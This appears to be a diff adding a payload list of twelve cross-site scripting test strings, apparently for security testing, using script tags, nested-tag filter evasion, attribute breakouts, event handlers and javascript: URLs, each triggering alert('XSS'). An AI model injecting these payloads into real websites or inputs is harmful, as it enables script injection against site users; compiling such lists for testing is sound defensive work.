@@ -1,0 +1,12 @@
+
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+"><svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe src="javascript:alert('XSS');"></iframe>
+<a href="javascript:alert('XSS')">Click Me</a>
+<div onmouseover="alert('XSS')">Hover Me</div>
